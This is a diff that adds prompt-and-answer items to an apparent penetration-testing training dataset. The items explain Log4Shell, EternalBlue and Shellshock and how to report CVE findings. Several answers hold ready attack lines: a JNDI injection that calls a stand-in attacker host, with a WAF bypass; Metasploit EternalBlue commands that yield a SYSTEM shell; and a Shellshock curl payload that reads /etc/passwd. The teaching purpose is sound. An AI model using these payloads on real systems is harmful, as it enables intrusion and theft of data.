+    "answer": "Log4Shell is a JNDI injection in Log4j 2.x (2.0-2.14.1). Log4j evaluates ${jndi:ldap://...} expressions in log messages. Any user-controlled string that gets logged is a vector (User-Agent, username, email, X-Forwarded-For). Confirmation: (1) Set up LDAP callback: marshalsec-0.0.3.jar LDAPRefServer + Burp Collaborator, or use interactsh. (2) Inject: ${jndi:ldap://ATTACKER_COLLABORATOR:1389/test} in User-Agent header. (3) If DNS/TCP callback received = vulnerable. RCE: serve a Java class via LDAP that executes commands when loaded by the victim's JVM. Many WAF bypasses: ${${lower:j}ndi:...}.",
+    "difficulty": "advanced"
+  },
+  {
+    "module_id": 50,
+    "prompt": "How do you exploit MS17-010 (EternalBlue) and what systems are vulnerable?",
+    "answer": "Vulnerable: unpatched Windows 7 SP1 / Windows Server 2008 R2 SP1 and earlier (unless MS17-010 patch applied). Exploit SMBv1 protocol bug. (1) Confirm vulnerability: nmap -p 445 --script smb-vuln-ms17-010 10.10.10.5. If 'VULNERABLE' returned. (2) Metasploit: use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.10.5; set LHOST tun0; run. (3) Get SYSTEM shell. (4) Alternative: impacket-ping or manual Python scripts. Note: EternalBlue crashes the target on failure — test carefully. Yields SYSTEM access without credentials on vulnerable hosts.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 50,
+    "prompt": "What is Shellshock (CVE-2014-6271) and how do you test for it?",
+    "answer": "Shellshock is a vulnerability in Bash where environment variables with function definitions are parsed and executed beyond the function definition. CGI scripts pass HTTP headers as environment variables to Bash shells. Test: curl -A '() { :;}; echo; cat /etc/passwd' http://target.com/cgi-bin/test.cgi. The () { :;}; is a function definition, followed by executable code after the semicolon. If vulnerable: response includes /etc/passwd content. Alternative vectors: HTTP Referer, User-Agent, X-Forwarded-For headers (whichever is logged). Still present: legacy Linux web servers, appliances, embedded devices, old Docker images.",
+    "difficulty": "intermediate"
+  },
+  {
+    "module_id": 50,
+    "prompt": "How should you document a CVE exploitation finding in a penetration test report?",
+    "answer": "CVE finding documentation: 1. Title: [System] [Version] — CVE-XXXX-XXXX ([Vulnerability Name]). 2. Severity (CVSS score + contextual justification). 3. Affected component: IP/hostname, software, exact version. 4. Vulnerability description: brief technical explanation of the bug. 5. Evidence: (a) Version detection screenshot, (b) Exploit command used (sanitize payload if needed), (c) Post-exploitation proof (whoami showing SYSTEM/root). 6. Impact: what could be achieved (code execution, data access, domain compromise). 7. Recommendation: (a) patch to version X, (b) disable feature, (c) network segmentation. 8. References: CVE link, vendor advisory, CVSS score.",
+    "difficulty": "beginner"
+  }
+]
